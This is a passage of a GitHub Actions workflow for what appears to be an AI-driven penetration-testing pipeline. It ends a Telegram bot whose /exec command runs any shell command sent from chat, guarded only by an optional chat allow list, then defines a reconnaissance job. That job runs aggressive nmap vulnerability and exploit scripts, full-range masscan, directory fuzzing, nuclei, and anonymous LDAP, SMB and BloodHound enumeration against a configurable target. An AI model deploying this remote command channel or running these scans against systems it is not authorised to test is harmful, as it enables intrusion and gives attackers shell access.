              if not query: await update.message.reply_text("Usage: /ai <your question>"); return
              try:
                  proc = await asyncio.create_subprocess_exec('/opt/zygor/bin/ai_complete', '2048',
                      stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                  stdout, stderr = await proc.communicate(input=query.encode())
                  if stdout: await update.message.reply_text(stdout.decode()[:4000])
                  elif stderr: await update.message.reply_text(f"AI error: {stderr.decode()[:2000]}")
                  else: await update.message.reply_text("AI returned empty response.")
              except Exception as e:
                  await update.message.reply_text(f"Error: {str(e)}")

          async def exec_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
              if ALLOWED and str(update.effective_chat.id) not in ALLOWED: return
              cmd = ' '.join(context.args)
              if not cmd: await update.message.reply_text("Usage: /exec <shell command>"); return
              try:
                  proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                  stdout, stderr = await proc.communicate()
                  output = (stdout.decode()[:3500] + "\n" + stderr.decode()[:500]).strip()
                  await update.message.reply_text(output or "No output")
              except Exception as e:
                  await update.message.reply_text(str(e))

          async def abort(update: Update, context: ContextTypes.DEFAULT_TYPE):
              if ALLOWED and str(update.effective_chat.id) not in ALLOWED: return
              token = os.environ.get('GITHUB_TOKEN_ABORT', '')
              repo = os.environ.get('GITHUB_REPO', '')
              run_id = os.environ.get('GITHUB_RUN_ID', '')
              subprocess.run(f"curl -s -X POST -H 'Authorization: token {token}' "
                             f"'https://api.github.com/repos/{repo}/actions/runs/{run_id}/cancel'", shell=True)
              await update.message.reply_text("🛑 Abort signal sent.")

          async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
              if ALLOWED and str(update.effective_chat.id) not in ALLOWED: return
              await update.message.reply_text(
                  f"Target: {os.environ.get('TARGET')}\nPhase: {os.environ.get('PHASE')}\n"
                  f"Model: {os.environ.get('AI_MODEL')}\nRun ID: {os.environ.get('GITHUB_RUN_ID')}")

          def main():
              app = Application.builder().token(TOKEN).build()
              app.add_handler(CommandHandler("start", start))
              app.add_handler(CommandHandler("ai", ai))
              app.add_handler(CommandHandler("exec", exec_cmd))
              app.add_handler(CommandHandler("abort", abort))
              app.add_handler(CommandHandler("status", status))
              app.run_polling()

          if __name__ == '__main__':
              main()
          PYEOF
          chmod +x /tmp/telegram_zygor_bot.py
          python3 /tmp/telegram_zygor_bot.py

  reconnaissance:
    name: '🔍 Phase 1 – Reconnaissance'
    needs: [bootstrap]
    runs-on: ubuntu-latest
    timeout-minutes: 360
    if: github.event_name == 'schedule' || inputs.penetration_phase == 'recon' || inputs.penetration_phase == 'full'
    strategy:
      fail-fast: false
      matrix:
        module:
          - network_scan
          - web_discovery
          - ad_enum
          - wireless_survey
          - osint_gather
    steps:
      - name: '📥 Checkout repository'
        uses: actions/checkout@v4
      - name: '🔧 Set up AI tooling'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
          mkdir -p /tmp/recon
      - name: '📡 Network Scan'
        if: matrix.module == 'network_scan'
        shell: bash
        run: |
          nmap -T4 -A -p- --script vuln,exploit -oA /tmp/recon/nmap_full $TARGET 2>/dev/null || true
          masscan $TARGET --ports=1-65535 --rate=10000 -oX /tmp/recon/masscan.xml 2>/dev/null || true
          sudo arp-scan --localnet > /tmp/recon/arp_scan.txt 2>/dev/null || true
      - name: '🌐 Web Discovery'
        if: matrix.module == 'web_discovery'
        shell: bash
        run: |
          subfinder -d $TARGET -o /tmp/recon/subdomains.txt 2>/dev/null || true
          whatweb $TARGET -a 3 --log-json=/tmp/recon/whatweb.json 2>/dev/null || true
          ffuf -u http://${TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o /tmp/recon/ffuf_default.json -of json -t 50 2>/dev/null || true
          nuclei -u http://${TARGET} -severity critical,high,medium -o /tmp/recon/nuclei_web.txt 2>/dev/null || true
      - name: '🏢 AD/LDAP Enumeration'
        if: matrix.module == 'ad_enum'
        shell: bash
        run: |
          ldapsearch -x -h $TARGET -p 389 -s base -b "" > /tmp/recon/ldap_base.txt 2>/dev/null || true
          bloodhound-python -d $TARGET -u guest -p '' -ns $TARGET -c all --zip -o /tmp/recon/bloodhound 2>/dev/null || true
          smbclient -L //$TARGET -N > /tmp/recon/smb_shares.txt 2>/dev/null || true
      - name: '📶 Wireless Survey'
        if: matrix.module == 'wireless_survey'
        shell: bash
        run: iw dev 2>/dev/null || echo "No wireless interfaces"
      - name: '🕵️ OSINT Gathering'
        if: matrix.module == 'osint_gather'
        shell: bash
        run: |
          dig any $TARGET > /tmp/recon/dns_records.txt 2>/dev/null || true
          whois $TARGET > /tmp/recon/whois_data.txt 2>/dev/null || true
          curl -s "https://crt.sh/?q=%25.${TARGET}&output=json" > /tmp/recon/cert_transparency.json 2>/dev/null || true
      - name: '📤 Upload recon artifacts'
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: recon-${{ matrix.module }}-${{ github.run_id }}
          path: /tmp/recon/
          if-no-files-found: warn

